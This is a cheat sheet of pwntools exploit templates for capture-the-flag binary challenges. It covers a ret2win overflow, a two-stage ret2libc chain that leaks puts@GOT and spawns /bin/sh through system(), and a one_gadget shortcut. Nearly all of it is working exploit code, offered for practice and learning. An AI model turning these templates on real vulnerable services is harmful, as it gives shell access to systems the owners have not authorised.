# ROP Chain Templates

## ret2win (Simple)

```python
from pwn import *

elf = ELF('./challenge')
context.binary = elf

p = process(elf.path)

offset = 64
rop = ROP(elf)

payload = flat(
    b'A' * offset,
    rop.find_gadget(['ret'])[0],  # Stack alignment (Ubuntu/x86_64)
    elf.symbols['win'],           # Target function
)

p.sendline(payload)
p.interactive()
```

## ret2libc (Leak + System)

```python
from pwn import *

elf = ELF('./challenge')
libc = ELF('./libc.so.6')  # Or libc from server
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def exploit():
    p = conn()
    rop = ROP(elf)
    offset = 64

    # --- Stage 1: Leak puts@GOT ---
    rop.call('puts', [elf.got['puts']])
    rop.call(elf.symbols['main'])  # Return to main for second stage

    payload = flat(b'A' * offset, rop.chain())
    p.sendlineafter(b'> ', payload)

    # Parse leak
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.success(f'puts leak: {hex(leak)}')

    # Calculate libc base
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base: {hex(libc.address)}')

    # --- Stage 2: system("/bin/sh") ---
    rop2 = ROP(libc)
    rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])

    payload2 = flat(b'A' * offset, rop2.chain())
    p.sendlineafter(b'> ', payload2)

    p.interactive()

if __name__ == '__main__':
    exploit()
```

## one_gadget Shortcut

```bash
# Find one_gadget constraints
one_gadget ./libc.so.6
# Output:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL
```

```python
# Use in exploit
one_gadget = libc.address + 0x4f3d5
payload = flat(b'A' * offset, one_gadget)
```
